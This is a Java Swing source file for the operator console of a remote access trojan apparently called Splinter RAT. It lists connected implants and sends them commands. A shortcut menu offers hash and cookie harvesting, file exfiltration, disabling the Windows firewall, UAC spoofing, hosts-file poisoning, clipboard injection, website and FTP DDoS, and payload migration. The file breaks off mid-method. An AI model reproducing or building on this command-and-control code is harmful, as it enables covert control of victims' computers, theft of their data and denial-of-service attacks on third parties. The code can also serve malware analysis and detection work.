/***
 * Main GUI Panel to display the broadcast messages sent and received.
 * 
 * 
 * @author Solomon Sonya 
 */


package Controller.GUI;

import Controller.Drivers.*;

import java.awt.Frame;
import javax.swing.JFrame;
import java.awt.Dimension;
import javax.swing.*;
import java.lang.*;
import java.awt.Frame;
import javax.swing.border.*;

import java.awt.*;

import java.awt.GridBagConstraints;
import java.awt.Color;
import java.awt.ComponentOrientation;

import javax.swing.DefaultComboBoxModel;
import javax.swing.ImageIcon;
import javax.swing.JCheckBox;
import javax.swing.JFileChooser;
import javax.swing.JScrollPane;
import javax.swing.JSplitPane;
import javax.swing.SwingConstants;
import java.awt.Rectangle;
import java.awt.BorderLayout;
import javax.swing.JLabel ;
import java.lang.*;
import java.awt.Label;
import java.awt.event.KeyEvent;
import java.awt.Panel;
import java.awt.SystemColor;
import javax.swing.JRadioButton;
import java.text.*;
import java.util.*;
import java.awt.Font;
import java.awt.FlowLayout;
import java.awt.GridLayout;
import javax.swing.JPanel;
import javax.swing.JSlider;
import java.awt.event.*;
import java.awt.Point;
import javax.swing.BorderFactory;
import javax.swing.border.EtchedBorder;
import javax.swing.border.TitledBorder;
import java.awt.ScrollPane;
import javax.swing.border.BevelBorder;
import javax.swing.border.SoftBevelBorder;
import javax.swing.event.ListSelectionEvent;
import javax.swing.event.ListSelectionListener;
import javax.swing.text.DefaultStyledDocument;
import javax.swing.text.SimpleAttributeSet;
import javax.swing.text.Style;
import javax.swing.text.StyleConstants;
import javax.swing.text.StyleContext;
import javax.swing.text.StyledDocument;
import javax.swing.JOptionPane;
import javax.swing.JTabbedPane;
import java.awt.Button;
import javax.swing.JButton;
import javax.swing.JTextField;
import java.awt.Choice;
import javax.swing.JComboBox;
import java.net.*;
import javax.swing.WindowConstants;
import javax.swing.table.*;

import Controller.Thread.Thread_Terminal;
import Dialogs.Dialog_File_Or_Payload_Upload;
import Implant.Driver;
import Implant.Splinter_IMPLANT;

import java.io.*;
import java.awt.GridBagLayout;
import java.awt.event.*;


public class JPanel_MainControllerWindow extends JPanel implements ActionListener, ListSelectionListener, KeyListener
{
	String strMyClassName = this.getName();
	
	Thread_Terminal thdPrivateTerminal = null;
	public Frame_PrivateTerminal myPrivateFrame = null;

	JPanel jpnlSecretMsgMode_And_JScrollPane = new JPanel(new BorderLayout());
		public JLabel jlblSecretMessageMode = new JLabel("   Secret Msg --> ", JLabel.LEFT);
	public JPanel_TextDisplayPane txtpne_broadcastMessages;
	private JScrollPane jscrlPne_BroadcastMessage;
	private JPanel jpnlConnectedClients;
	
	public JButton jbtnSend_Broadcast;
	public JButton jbtnClearScreen = new JButton("Clear Screen");
	public JButton jbtnMigratePayload = new JButton("Migrate Payload");
	public JTextField jtfCommand_Broadcast = new JTextField(20);
	public JButton jbtnSend_Private;
	public JTextField jtfCommand_Private = new JTextField(20);
	public JPanel jpnlSend = new JPanel();
	JPanel jpnlSOUTH_Send_And_OptionButtons = new JPanel(new BorderLayout());//SOLO, SEE BELOW FOR THE RESET OF THE GRID LAYOUT!!!
	JPanel jpnlOptionButtons = new JPanel(new GridLayout(1,1));
	
	JPanel jpnlTerminalCommand = new JPanel(new BorderLayout());
		public JLabel jlblTerminalWorkingDirectory = new JLabel("> ");
		public JTextField jtfTerminalCommand = new JTextField(12);
	
	JSplitPane jspltPne_ConnectedClients = null;
	
	boolean messageTransmittedOK = true;
	
	JPanel jpnlSouth_Beacon = new JPanel(new BorderLayout());
	
	private ArrayList<String> alMyCommandHistory = new ArrayList<String>();
	int currentCommandHistoryIndex = 0;
	int nextAvailSlotInHistory = 0;
	static final int MAX_COMMAND_HISTORY = 10;//KEEP A RUNNING HISTORY AND LENG OF 20
	static final int HISTORY_MAX_BYTES_TO_STORE = 150;
	
	JPanel jpnlMessage_Text_And_ActionButton = new JPanel(new BorderLayout());
	
	JLabel jlblConnectedClients_Text = new JLabel("Connected Clients", JLabel.CENTER);
	public DefaultListModel dfltLstMdl_ConnectedClients = new DefaultListModel();
	public JList jlstConnectedClients = null;	
		JScrollPane jscrlPne_ConnectedClients = null;
	
	public static String 	strShortcut_Title = "Shortcuts", 
							strShortcut_ScreenCapture = "Capture Screen",
							strShortcut_ScreenScrape = "Scrape Screen",
							strShortcut_HaltScreenRecord = "Halt Screen Scrape",
							strShortcut_HarvestHash = "Harvest Hashes",
							strShortcut_HarvestCookies = "Harvest Cookies",
							strShortcut_StopProcessExecutionImmediately = "Halt Running Tasks Immediately",
							strShortcut_HarvestBrowserHistory = "Harvest Browser History",
							strDownloadFileFromSystem = "Download File From RHOST",
							strOrbitDirectory = "Orbit Directory",
							strStopOrbitDirectory = "Stop Orbit Directory",
							strEnumerateSystem = "Enumerate System",
							strUploadFileFromSystem = "Upload File From RHOST",
							strBrowseFileSystem = "Browse RHOST File System",
							strHarvestFilesByType = "Harvest Files By Type",
							strHarvestFilesUnderDirectory = "Exfil Files", //(recursive)			
							strRunningProcessList = "Running Process List",
							strHarvestWirelessProfile = "Harvest Wireless Profile(if applicable)",
							strDisableWindowsFirewall = "Disable Windows Firewall",
							strEnableWindowsFirewall = "Enable Windows Firewall",
							strDisplayWindowsFirewall = "Display Windows Firewall",
							strShortcut_CopyClipboard= "Extract Clipboard",
							strShortcut_InjectIntoClipboard= "Inject Into Clipboard",
							strShortcut_EnableClipboardExtraction= "Enable Clipboard Extractor",
							strShortcut_DisableClipboardExtraction= "Disable Clipboard Extractor",
							strShortcut_EnableClipboardInjection = "Enable Clipboard Injector",
							strShortcut_DisableClipboardInjection = "Disable Clipboard Injector",
							strDisplayDNS = "Display DNS Entries",
							strSpoofWindowsUAC = "Spoof Windows UAC",
							strShortcutSetWallPaper = "Set Wall Paper",
							strShortcut_grab_host_file = "Grab Windows Host File", 
							strShortcut_append_to_host_file = "Append to Windows Host File", 
							strShortcut_poison_host_file = "Poison Windows DNS Host File", 
							strOverwrite_DNS_Host_File = "Overwrite Windows Host File",
							strDOS_Website = "DDOS Website",
							strDOS_Website_HALT = "Halt Website DOS",
							strShortcut_EstablishPersistentListener = "Establish Persistent Listener",//This is mainly for use if internal to the network or from pivoting!!!  simply pass the commands "start splinter_rat.jar -L X" where X will be queried from the user to provide the port number, we enter the full string in the textfield, and let the user hit send command! 
							strShortcut_CreateMassUserAccounts = "Create User Accounts from CSV List",
							strShortcut_DeleteMassUserAccounts = "Delete User Accounts from CSV List",
							strShortcut_EstablishShellToController = "Establish Shell to Controller",
							strShortcut_DOS_FTP_Server = "DDOS FTP Server", 
							strShortcut_HALT_DOS_FTP_Server = "Halt FTP Server DOS"
							
							
							;
	
	JPanel jpnlShortcut = new JPanel(new BorderLayout());
	JPanel jpnlShortcut_Alignment = new JPanel();
	public JComboBox jcbShortcuts;
	
	
	/**
	 * 
	 * SOLO, UNCOMMENT OUT THE NEXT LINE, THIS IS THE TRUE FEATURES FOR THE SHORTCUTS, THE ONE USED NOW, IS WITH FEATURES REMOVED I'M JUST NOT READY TO PROGRAM YET
	 * 
	 */
//String [] arrShortcuts = new String[]{strShortcut_Title, strShortcut_StopProcessExecutionImmediately, strShortcut_EstablishPersistentListener, strShortcut_ScreenCapture, strShortcut_ScreenScrape, strShortcut_HaltScreenRecord, strOrbitDirectory, strStopOrbitDirectory, strDownloadFileFromSystem, strBrowseFileSystem, strRunningProcessList, strSpoofWindowsUAC, strEnumerateSystem, strHarvestFilesUnderDirectory, strDisplayDNS, strShortcut_HarvestHash, strShortcut_HarvestCookies, strShortcut_HarvestBrowserHistory, strHarvestWirelessProfile, strDisplayWindowsFirewall, strEnableWindowsFirewall, strDisableWindowsFirewall, strHarvestFilesByType, strUploadFileFromSystem ,strShortcutSetWallPaper, strShortcut_CopyClipboard, strShortcut_InjectIntoClipboard, strShortcut_EnableClipboardExtraction, strShortcut_EnableClipboardInjection, strShortcut_DisableClipboardExtraction, strShortcut_DisableClipboardInjection};
	String [] arrShortcuts = new String[]{strShortcut_Title, strShortcut_StopProcessExecutionImmediately, strShortcut_EstablishPersistentListener, strShortcut_ScreenCapture, strShortcut_ScreenScrape, strShortcut_HaltScreenRecord, strOrbitDirectory, strStopOrbitDirectory, strDownloadFileFromSystem, strBrowseFileSystem, strRunningProcessList, strSpoofWindowsUAC, strEnumerateSystem, strHarvestFilesUnderDirectory, strDisplayDNS, /*strShortcut_HarvestHash, strShortcut_HarvestCookies, strShortcut_HarvestBrowserHistory, strHarvestWirelessProfile,*/ strDisplayWindowsFirewall, strEnableWindowsFirewall, strDisableWindowsFirewall, /*strHarvestFilesByType, strUploadFileFromSystem ,strShortcutSetWallPaper,*/ strShortcut_CopyClipboard, strShortcut_InjectIntoClipboard, strShortcut_EnableClipboardExtraction, strShortcut_EnableClipboardInjection, strShortcut_DisableClipboardExtraction, strShortcut_DisableClipboardInjection, strShortcut_grab_host_file, strShortcut_append_to_host_file, strShortcut_poison_host_file, strOverwrite_DNS_Host_File, strDOS_Website, strDOS_Website_HALT, strShortcut_CreateMassUserAccounts, strShortcut_DeleteMassUserAccounts, strShortcut_EstablishShellToController, strShortcut_DOS_FTP_Server, strShortcut_HALT_DOS_FTP_Server};
		
		
		String strConnectedClientsToolTip = "<html>" 	+ " Select the Client you wish to send a <b> PRIVATE </b> message to."
														+ "<br>" + 	"Hold down the [CTRL] key to select multiple Clients." 
														+ "<br>" + "If no clients are selected, the message will be broadcasted to all connected Clients" 
														+ "</html>";
	
		JButton jbtnPrivate;
		JButton jbtnBrowseSystem = new JButton("Browse");
		JButton jbtnDisconnectClient = new JButton("Disconnect Client");
		JPanel jpnlPrivateTerminal = new JPanel(new GridLayout(2,1));//SOLO, SEE THE RESET OF THE GRID LAYOUT BELOW!!!!!
		JPanel jpnlPrivateChatOptions = new JPanel(new GridLayout(1,2));
		JRadioButton jrbPrivateFrame = new JRadioButton("Private Frame", true);
		JRadioButton jrbPrivateTab = new JRadioButton("Private Tab");
		ButtonGroup btngrp = new ButtonGroup();
		
		JPanel jpnlScreenName = new JPanel(new BorderLayout());
		JLabel jlblMyScreenName = new JLabel("  Screen Name:           ", JLabel.RIGHT);
		JTextField jtfMyScreenName = new JTextField(14);
		
		JPanel jpnlOptions_ConnectedClients_South = new JPanel(new GridLayout(8,1)); 
	JPanel jpnlCheckbox_and_jbtnOpen = new JPanel(new GridLayout(1,2));	
		public JCheckBox jcbAutoScroll = new JCheckBox("Auto Scroll", true);
		public JButton jbtnOpenFileHive = new JButton("Open FileHive");
		
	int[] selectedImplantIndecies = null;
	
	int loadIndex = 0;
	/**
	 * loading index:
	 * 0 == main terminal broadcast (public)
	 * 1 == main chat broadcast (public)
	 * 2 == private terminal frame
	 * 3 == private chat frame
	 * 4 == running process list
	 */
	
	public static final int INDEX_THIS_IS_MAIN_BROADCAST_TERMINAL = 0;
	public static final int INDEX_THIS_IS_PRIVATE_TERMINAL_FRAME = 1;
	public static final int INDEX_THIS_IS_CHAT_BROADCAST_TERMINAL = 2;
	public static final int INDEX_THIS_IS_CHAT_PRIVATE_FRAME = 3;
	public static final int INDEX_THIS_IS_RUNNING_PROCESS_ = 4;
	public static final int INDEX_THIS_IS_BEACONING_BROADCAST_TERMINAL = 5;
	
	public boolean i_am_broadcast_frame = true;
	public boolean i_am_private_frame = false;
	public boolean i_am_public_chat_frame = false;

	public int myLoadingIndex = 0;
	
	String terminalText = "";
	
	public JPanel_MainControllerWindow(int loadIdx, boolean loadingPrivateFrame, Thread_Terminal privateThd)
	{
		this.setBackground(Color.RED);
		this.setLayout(new BorderLayout());
		thdPrivateTerminal = privateThd;
		
		myLoadingIndex = loadIdx;
		
		i_am_private_frame = loadingPrivateFrame;
		i_am_broadcast_frame = !loadingPrivateFrame;
		
		
		//switch
		
		initializeBroadcastMessages(loadingPrivateFrame);
								
	} 
	
	public void initializeBroadcastMessages(boolean iAm_Loading_PrivateFrame)
	{
		try
		{
			//////////////////////////////////////////////////////////
			//Broadcast Text Pane and Send Button
			/////////////////////////////////////////////////////////
			txtpne_broadcastMessages = new JPanel_TextDisplayPane();
			
			/*jpnlSecretMsgMode_And_JScrollPane.add(BorderLayout.NORTH, this.jlblSecretMessageMode);
			jpnlSecretMsgMode_And_JScrollPane.add(BorderLayout.CENTER, txtpne_broadcastMessages);
			jscrlPne_BroadcastMessage = new JScrollPane(jpnlSecretMsgMode_And_JScrollPane);*/
			
			//HIDE BORDER IF IN A PRIVATE TERMINAL
			if(this.i_am_broadcast_frame)
			{
				jscrlPne_BroadcastMessage = new JScrollPane(txtpne_broadcastMessages); //2013-02-09 solo edit
			}
			else if(this.i_am_private_frame)
			{
				//hide the automatic border on the scrollpane
				try
				{
					jscrlPne_BroadcastMessage = new JScrollPane(txtpne_broadcastMessages)
					{
						@Override public void setBorder(Border brdr)
						{
							//DO NOTHING!!!
						}
					};
					
					jscrlPne_BroadcastMessage.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_NEVER);
					jscrlPne_BroadcastMessage.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_AS_NEEDED);
				}
				catch(Exception e){jscrlPne_BroadcastMessage = new JScrollPane(txtpne_broadcastMessages);} //2013-02-24 solo edit
			}
			
			
			
			
			
			jpnlSecretMsgMode_And_JScrollPane.add(BorderLayout.NORTH, this.jlblSecretMessageMode);			
			jpnlSecretMsgMode_And_JScrollPane.add(BorderLayout.CENTER, jscrlPne_BroadcastMessage);
			//jscrlPne_BroadcastMessage = new JScrollPane(jpnlSecretMsgMode_And_JScrollPane);
			
//jscrlPne_BroadcastMessage = new JScrollPane(txtpne_broadcastMessages); //2013-02-09 solo edit
			//jscrlPne_BroadcastMessage.setBounds(10, 11, 740, 338);			
			//jpnlMainController.add(jscrlPne_BroadcastMessage);
			
//jpnlMessage_Text_And_ActionButton.add(BorderLayout.CENTER, jscrlPne_BroadcastMessage);//2013-02-09 solo edit
			jpnlMessage_Text_And_ActionButton.add(BorderLayout.CENTER, jpnlSecretMsgMode_And_JScrollPane);
			jpnlMessage_Text_And_ActionButton.setBounds(10, 11, 745, 414);
			
			
			jpnlSend.setLayout(new BorderLayout());			
			jbtnSend_Broadcast = new JButton("Broadcast");
			jbtnSend_Private = new JButton("Send Command");
			
			this.jcbShortcuts = new JComboBox();
			this.jcbShortcuts.setModel(new DefaultComboBoxModel(arrShortcuts));
			
			//selective load based on main GUI or private terminal frame
			if(iAm_Loading_PrivateFrame)
			{
				//use the following if you want to show the jextfield and the jbutton to send a command //2013-02-24 solo edit
				/*jpnlSend.add(BorderLayout.CENTER, jtfCommand_Private);
				jpnlSend.add(BorderLayout.EAST, jbtnSend_Private);
				jpnlSOUTH_Send_And_OptionButtons.add(jpnlSend);*/
				
				
				//override to have no border
				try
				{
					jtfTerminalCommand = new JTextField(12)
					{
						@Override public void setBorder(Border brdr)
						{
							//DO NOTHING!!!
						}
					};
				}
				catch(Exception e){jtfTerminalCommand = new JTextField(12);}
				
				this.jpnlTerminalCommand.add(BorderLayout.WEST, this.jlblTerminalWorkingDirectory);
				this.jpnlTerminalCommand.add(BorderLayout.CENTER, this.jtfTerminalCommand);
				
				jpnlSOUTH_Send_And_OptionButtons.add(BorderLayout.NORTH,jpnlTerminalCommand);
				
				//set the current working directory
				this.jlblTerminalWorkingDirectory.setText(thdPrivateTerminal.myCurrentWorkingDirectory);
			}
			else
			{	
				jpnlSend.add(BorderLayout.CENTER, jtfCommand_Broadcast);
				jpnlSend.add(BorderLayout.EAST, jbtnSend_Broadcast);
			}
			
			
			jpnlSend.setBorder(new BevelBorder(BevelBorder.RAISED, null, null, null, null));
			
			
			
			
			//only add the clear below if this is a private frame
			if(this.i_am_private_frame)
			{
				//jpnlSOUTH_Send_And_OptionButtons.setLayout(new GridLayout(2,1));
				jpnlOptionButtons.add(jbtnClearScreen);
			}
			
			//jpnlSOUTH_Send_And_OptionButtons.add(jpnlOptionButtons);
			
			jpnlMessage_Text_And_ActionButton.add(BorderLayout.SOUTH, jpnlSOUTH_Send_And_OptionButtons);
			
			
			//add(jpnlMessage_Text_And_ActionButton);
this.add(BorderLayout.CENTER, jpnlMessage_Text_And_ActionButton); //2013-02-07 solo edits
			
			//////////////////////////////////////////////////////////////////////
			//Connected Clients
			////////////////////////////////////////////////////////////////////
			
			//jscrlPne_BroadcastMessage.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_AS_NEEDED);
			//jscrlPne_BroadcastMessage.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_AS_NEEDED);
			//jscrlPne_BroadcastMessage.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_NEVER);
			
			
			if(this.i_am_broadcast_frame)
			{
				jscrlPne_BroadcastMessage.setBorder(new CompoundBorder(new BevelBorder(BevelBorder.RAISED, null, null, null, null), new BevelBorder(BevelBorder.LOWERED, null, null, null, null)));
				
				jscrlPne_BroadcastMessage.setHorizontalScrollBarPolicy(ScrollPaneConstants.HORIZONTAL_SCROLLBAR_AS_NEEDED);
				jscrlPne_BroadcastMessage.setVerticalScrollBarPolicy(ScrollPaneConstants.VERTICAL_SCROLLBAR_AS_NEEDED);
			}
			
			jpnlConnectedClients = new JPanel();
			//jpnlConnectedClients.setBounds(760, 11, 235, 414);
									
			jpnlConnectedClients.setLayout(new BorderLayout());
			jpnlConnectedClients.setBorder(new CompoundBorder(new BevelBorder(BevelBorder.RAISED, null, null, null, null), new BevelBorder(BevelBorder.LOWERED, null, null, null, null)));
			
			jscrlPne_ConnectedClients = new JScrollPane(jlstConnectedClients);
			//dfltLstMdl_ConnectedClients = new DefaultListModel();
			jlstConnectedClients = new JList(dfltLstMdl_ConnectedClients);
			jscrlPne_ConnectedClients.setViewportView(jlstConnectedClients);
			
			jlstConnectedClients.setSelectionMode(ListSelectionModel.SINGLE_SELECTION);//for now, reject mult selections
			jlstConnectedClients.validate();
			
			//dfltLstMdl_ConnectedClients.addElement("TESTING!");
			//Drivers.sop("Size: " + dfltLstMdl_ConnectedClients.getSize());
			//dfltLstMdl_ConnectedClients.removeAllElements();
			

			jpnlConnectedClients.add(BorderLayout.NORTH, jlblConnectedClients_Text);
			
	
			
			jpnlConnectedClients.add(BorderLayout.CENTER, jscrlPne_ConnectedClients);
			jpnlConnectedClients.add(BorderLayout.SOUTH, jpnlOptions_ConnectedClients_South); 
			
			jbtnPrivate = new JButton("Private Terminal");
			jbtnBrowseSystem = new JButton("Browse Remote File System");
			
			
			if(this.i_am_broadcast_frame)
			{											
				jpnlSOUTH_Send_And_OptionButtons.setLayout(new BorderLayout());
				jpnlSOUTH_Send_And_OptionButtons.add(BorderLayout.CENTER, jpnlSend);
				
				btngrp.add(jrbPrivateFrame);btngrp.add(jrbPrivateTab);
				jpnlPrivateChatOptions.add(jrbPrivateFrame);
				jpnlPrivateChatOptions.add(jrbPrivateTab);
				
				this.jpnlOptions_ConnectedClients_South.add(jcbShortcuts);
				this.jpnlOptions_ConnectedClients_South.add(jbtnPrivate);
				this.jpnlOptions_ConnectedClients_South.add(jbtnBrowseSystem);
				this.jpnlOptions_ConnectedClients_South.add(this.jbtnMigratePayload);				
				this.jpnlOptions_ConnectedClients_South.add(jbtnDisconnectClient);
				this.jpnlOptions_ConnectedClients_South.add(jbtnClearScreen);
				this.jpnlOptions_ConnectedClients_South.add(jpnlPrivateChatOptions);
				
				jpnlCheckbox_and_jbtnOpen.add(jcbAutoScroll);
				jpnlCheckbox_and_jbtnOpen.add(jbtnOpenFileHive);
				this.jpnlOptions_ConnectedClients_South.add(jpnlCheckbox_and_jbtnOpen);
				//this.jpnlOptions_ConnectedClients_South.add();
				
				jbtnBrowseSystem.setBackground(Color.CYAN.darker().darker());
				
				
			}
			else
			{
				jpnlPrivateTerminal.add(jbtnPrivate);
				jpnlPrivateTerminal.add(jbtnDisconnectClient);
			}
			
			
			
			
			
			jbtnPrivate.setBackground(Color.green.darker());
			
			jbtnDisconnectClient.setBackground(Color.red);
			
			jbtnDisconnectClient.addActionListener(this);
			
			
			//add(jpnlConnectedClients);
			if(!iAm_Loading_PrivateFrame)
			{
				jspltPne_ConnectedClients = new JSplitPane(JSplitPane.HORIZONTAL_SPLIT, jpnlMessage_Text_And_ActionButton, jpnlConnectedClients);
				jspltPne_ConnectedClients.setOneTouchExpandable(true);
				jspltPne_ConnectedClients.setDividerLocation(990);
				this.add(BorderLayout.CENTER,jspltPne_ConnectedClients); 
			}
			
			if(myLoadingIndex == INDEX_THIS_IS_BEACONING_BROADCAST_TERMINAL)
			{
				jpnlConnectedClients.setVisible(false);
				jpnlSend.setVisible(false);
				
				jpnlSouth_Beacon.add(BorderLayout.CENTER, jbtnClearScreen);
				jpnlSouth_Beacon.add(BorderLayout.EAST, jcbAutoScroll);
				this.add(BorderLayout.SOUTH, jpnlSouth_Beacon);
				
			}
			
			
			
			////////////////////////////////////////////////////////////////////
			
			//tooltips yup, git ya sum!!!
			jlblConnectedClients_Text.setToolTipText(strConnectedClientsToolTip);
			jlstConnectedClients.setToolTipText(strConnectedClientsToolTip);
			
			jlblConnectedClients_Text.setBorder(new BevelBorder(BevelBorder.RAISED, null, null, null, null));
			
			jrbPrivateTab.setEnabled(false);//i'm not going to work on this for now...
			
			//jlstConnectedClients.setSelectionMode(ListSelectionModel.MULTIPLE_INTERVAL_SELECTION);
			
			//txtpne_broadcastMessages.appendString(true, false, "ME", "You", "Test Msg");
			
			//action mtds
			jbtnSend_Broadcast.addActionListener(this);
			this.jbtnPrivate.addActionListener(this);
			jbtnBrowseSystem.addActionListener(this);
			this.jbtnSend_Private.addActionListener(this);
			this.jtfCommand_Broadcast.addActionListener(this);
			this.jtfCommand_Private.addActionListener(this);
			jbtnClearScreen.addActionListener(this);
			jcbShortcuts.addActionListener(this);
			jcbAutoScroll.addActionListener(this);
			jbtnOpenFileHive.addActionListener(this);
			this.jbtnMigratePayload.addActionListener(this);
			jtfTerminalCommand.addActionListener(this);
			jlblSecretMessageMode.setOpaque(true);
			jlblSecretMessageMode.setFont(new Font("Courier", Font.BOLD, 12));
			jlblSecretMessageMode.setVisible(false);
			jlblSecretMessageMode.setForeground(Color.white);
			jlblSecretMessageMode.setBackground(Color.red);
			jlstConnectedClients.addListSelectionListener(this);
			
			this.jtfCommand_Private.addKeyListener(this);
			this.jtfCommand_Broadcast.addKeyListener(this);
			this.jtfTerminalCommand.addKeyListener(this);
			
			
			this.jpnlSend.setBackground(Color.yellow);
			jpnlTerminalCommand.setOpaque(true);
			jlblTerminalWorkingDirectory.setOpaque(true);
			jtfTerminalCommand.setOpaque(true);
			
			jpnlTerminalCommand.setBackground(Drivers.clrBackground);
			jlblTerminalWorkingDirectory.setBackground(Drivers.clrBackground);
			jtfTerminalCommand.setBackground(Drivers.clrBackground);
			jtfTerminalCommand.setCaretColor(Drivers.clrImplant);			
			jlblTerminalWorkingDirectory.setForeground(Drivers.clrImplant);
			jtfTerminalCommand.setForeground(Drivers.clrImplant);
			
		}
		catch(Exception e)
		{
			Drivers.eop("initializeBroadcastMessages", strMyClassName, e, "", true);
		}
	}
	
	
	
	public void valueChanged(ListSelectionEvent lse)
	{
		try
		{
			if(lse.getSource() == jlstConnectedClients)
			{
				int selectionIndex =this.jlstConnectedClients.getSelectedIndex(); 
				
				if(selectionIndex > -1)
				{
					this.setPrivateMessage(Drivers.alTerminals.get(selectionIndex).getJListData(), true);
				}
				else
				{
					//nothing selected
					this.setPrivateMessage("", false);
				}
			}
			
		}
		catch(Exception e )
		{
			Drivers.eop("valueChanged", strMyClassName, e, e.getLocalizedMessage(), false);
		}
	}
	
	public boolean setPrivateMessage(String recipients, boolean showPrivateMessageNotification)
	{
		try
		{
			jlblSecretMessageMode.setText("   Secret Message --> " + recipients);
			jlblSecretMessageMode.setVisible(showPrivateMessageNotification);
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("setPrivateMessage", strMyClassName, e, e.getLocalizedMessage(), false);
		}
		return false;
	}
	
	public void actionPerformed(ActionEvent ae)
	{
		try
		{
			if(ae.getSource() == jbtnSend_Broadcast)
			{
				broadcastCommand();
			}
			else if(ae.getSource() == jbtnPrivate)
			{
				establishPrivateTerminal();
			}
			
			else if(ae.getSource() == this.jbtnBrowseSystem)
			{
				this.jtfCommand_Broadcast.setText(Driver.FILE_BROWSER_INITIATE);//paste command
				broadcastCommand();//send command
			}
			
			else if(ae.getSource() == jbtnSend_Private)
			{
				sendPrivateMessage(thdPrivateTerminal);
			}
			else if(ae.getSource() == jtfCommand_Broadcast)
			{
				broadcastCommand();
			}
			else if(ae.getSource() == jtfCommand_Private)
			{
				sendPrivateMessage(thdPrivateTerminal);
			}
			
			else if(ae.getSource() == jtfTerminalCommand)
			{
				sendPrivateMessage(thdPrivateTerminal);
			}
			
			else if(ae.getSource() == jbtnClearScreen)
			{
				if(Drivers.jop_Confirm("Clear All Text From Screen?", "Clear Screen") == JOptionPane.YES_OPTION)
				{
					txtpne_broadcastMessages.clearTextPane();
				}
			}
			
			else if(ae.getSource() == jcbShortcuts)
			{
				insertShortcutCommand();
			}
			
			else if(ae.getSource() == jcbAutoScroll)
			{
				this.txtpne_broadcastMessages.autoScroll = jcbAutoScroll.isSelected();
			}
			
			else if (ae.getSource() == jbtnDisconnectClient)
			{
				Splinter_GUI.disconnectSelectedAgent(this.jlstConnectedClients.getSelectedIndex());
			}
			
			else if(ae.getSource() == jbtnOpenFileHive)
			{
				openFileHive();
			}
			
			else if(ae.getSource() == this.jbtnMigratePayload)
			{
				Dialog_File_Or_Payload_Upload dlgPayloadMigration = new Dialog_File_Or_Payload_Upload(this, Dialog_File_Or_Payload_Upload.load_index_upload_payload);
				dlgPayloadMigration.setVisible(true);
				
			}
			
		}
		catch(Exception e)
		{
			Drivers.eop(strMyClassName + " ae ", strMyClassName, e, e.getLocalizedMessage(), false);
		}
	}
	
	
	
	public void clearText()
	{
		try
		{
			txtpne_broadcastMessages.clearTextPane();
		}catch(Exception e){}
	}
	
	public boolean openFileHive()
	{
		try
		{
			if(Driver.fleFTP_FileHiveDirectory == null || !Driver.fleFTP_FileHiveDirectory.exists() || !Driver.fleFTP_FileHiveDirectory.isDirectory())
			{
				Splinter_GUI.setFTP_FileHiveDirectory();
				//return false;
			}
			
			//let the program recursively query the user until they select a valid dropbox, when complete, check to open the directory
			if(Driver.fleFTP_FileHiveDirectory == null || !Driver.fleFTP_FileHiveDirectory.exists() || !Driver.fleFTP_FileHiveDirectory.isDirectory())
			{
				Drivers.jop_Error("Drop Box not set!!!                          ", "Unable to complete selected action...");
				return false;
			}
			
			Process process = Runtime.getRuntime().exec("explorer.exe " + Driver.fleFTP_FileHiveDirectory.getCanonicalPath());
			return true;
		}
		catch(Exception e)
		{
			Drivers.eop("openFileHive", strMyClassName, e, e.getLocalizedMessage(), false);			
		}
		
		return false;
	}
	
	public boolean insertShortcutCommand()
	{
		try
		{
			String shortcut = (String)this.jcbShortcuts.getSelectedItem();
			
			if(shortcut == null || shortcut.trim().equals(""))
			{
				Drivers.sop("No shortcut commands selected by user");
				return false;
			}
			
			shortcut = shortcut.trim();
			
			/**
			 * CAPTURE SCREEN
			 * SCREEN SCRAPE
			 * 
			 */
			if(shortcut.equals(this.strShortcut_ScreenCapture))
			{
				this.jtfCommand_Broadcast.setText("capture screen");
				broadcastCommand();
			}
			
			/**
			 * RECORD SCREEN
			 * 
			 * 
			 */
			if(shortcut.equals(this.strShortcut_ScreenScrape))
			{
				this.jtfCommand_Broadcast.setText(Driver.SCRAPE_SCREEN);
				broadcastCommand();
				
				//solo, query user for capture in seconds
				
				//upon screen record, each time it becomes active, ensure the halt screen record flag is not set, if so, destroy self... otherwise, execute screen capture mtd
			}
			
			/**
			 * HALT RECORD SCREEN
			 * 
			 */
			if(shortcut.equals(this.strShortcut_HaltScreenRecord))
			{
				this.jtfCommand_Broadcast.setText(Driver.DISABLE_RECORD_SCREEN);
				broadcastCommand();
			}
			
			/**
			 * ENUMERATE SYSTEM
			 * 
			 */
			if(shortcut.equals(this.strEnumerateSystem))
			{
				this.jtfCommand_Broadcast.setText(Driver.ENUMERATE_SYSTEM);
				broadcastCommand();
			}
			
			
			/**
			 * 
			 * HARVEST WIRELESS PROFILE
			 * 
			 */
			if(shortcut.equals(this.strHarvestWirelessProfile))
			{
				this.jtfCommand_Broadcast.setText(Driver.HARVEST_WIRELESS_PROFILE);
				broadcastCommand();
			}
			
			/**
			 * 
			 * HARVEST COOKIES
			 * 
			 */
			if(shortcut.equals(this.strShortcut_HarvestCookies))
			{
				Drivers.jop_Warning("Feature is coming soon...                  ", "Feature not yet implemented...");
				return true;
				/*this.jtfCommand_Broadcast.setText(Driver.HARVEST_COOKIES);
				broadcastCommand();*/
			}
			
			/**
			 * 
			 * HARVEST BROWSER HISTORY
			 * 
			 */
			if(shortcut.equals(this.strShortcut_HarvestBrowserHistory))
			{
				Drivers.jop_Warning("Feature is coming soon...                  ", "Feature not yet implemented...");
				return true;
				/*this.jtfCommand_Broadcast.setText(Driver.HARVEST_BROWSER_HISTORY);
				broadcastCommand();*/
			}
			
			/**
			 * 
			 * ORBIT DIRECTORY (RECURSIVE)
			 * 
			 */
			if(shortcut.equals(this.strOrbitDirectory))
			{
				this.jtfCommand_Broadcast.setText(Driver.ORBIT_DIRECTORY + ", " + "c:\\users\\pwnie\\Desktop, *.*, true, 60");
				return true;
				/*this.jtfCommand_Broadcast.setText(Driver.HARVEST_BROWSER_HISTORY);
				broadcastCommand();*/
			}
			
			/**
			 * 
			 * STOP ORBIT DIRECTORY
			 * 
			 */
			if(shortcut.equals(this.strStopOrbitDirectory))
			{
				this.jtfCommand_Broadcast.setText(Driver.STOP_ORBIT_DIRECTORY);
				broadcastCommand();
				//return true;							
			}
			
			/**
			 * 
